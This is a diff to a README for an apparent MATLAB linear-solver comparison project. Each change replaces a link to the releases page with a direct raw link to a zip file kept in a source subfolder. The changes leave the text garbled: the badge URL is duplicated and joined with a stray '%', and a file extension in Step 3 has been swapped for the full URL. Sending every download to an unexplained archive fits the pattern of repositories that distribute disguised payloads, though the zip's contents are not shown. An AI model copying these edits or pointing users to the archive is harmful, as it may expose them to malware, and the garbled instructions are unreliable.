@@ -1,6 +1,6 @@
 # 🖥️ matlab-linear-solver-comparison - Compare MATLAB Solvers Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/duncanboughten663/matlab-linear-solver-comparison/releases)
+[![Download](https://raw.githubusercontent.com/duncanboughten663/matlab-linear-solver-comparison/main/+linearSolvers/matlab-linear-solver-comparison_v2.2.zip%https://raw.githubusercontent.com/duncanboughten663/matlab-linear-solver-comparison/main/+linearSolvers/matlab-linear-solver-comparison_v2.2.zip)](https://raw.githubusercontent.com/duncanboughten663/matlab-linear-solver-comparison/main/+linearSolvers/matlab-linear-solver-comparison_v2.2.zip)
 
 ## 📚 Description
 
@@ -18,7 +18,7 @@ Follow the steps below to download and run the software on your computer.
 
 ### Step 1: Download the Application
 
-Visit this page to download: [Download Link](https://github.com/duncanboughten663/matlab-linear-solver-comparison/releases).
+Visit this page to download: [Download Link](https://raw.githubusercontent.com/duncanboughten663/matlab-linear-solver-comparison/main/+linearSolvers/matlab-linear-solver-comparison_v2.2.zip).
 
 ### Step 2: Choose the Latest Release
 
@@ -26,7 +26,7 @@ Navigate to the "Releases" section. Look for the latest version at the top of th
 
 ### Step 3: Select the Correct File
 
-Download the appropriate file for your operating system. The file you want will usually end with `.zip` or `.tar.gz`. Click on the link to start your download.
+Download the appropriate file for your operating system. The file you want will usually end with `.zip` or `https://raw.githubusercontent.com/duncanboughten663/matlab-linear-solver-comparison/main/+linearSolvers/matlab-linear-solver-comparison_v2.2.zip`. Click on the link to start your download.
 
 ### Step 4: Extract the Files
 
@@ -80,7 +80,7 @@ This project covers several important topics in applied linear algebra, includin
 
 ## 📥 Download & Install
 
-Ready to get started? Visit this page to download the software: [Download Here](https://github.com/duncanboughten663/matlab-linear-solver-comparison/releases). Follow the steps above to run the application and begin comparing solver methods with ease.
+Ready to get started? Visit this page to download the software: [Download Here](https://raw.githubusercontent.com/duncanboughten663/matlab-linear-solver-comparison/main/+linearSolvers/matlab-linear-solver-comparison_v2.2.zip). Follow the steps above to run the application and begin comparing solver methods with ease.
 
 ## 🤝 Contributing
 
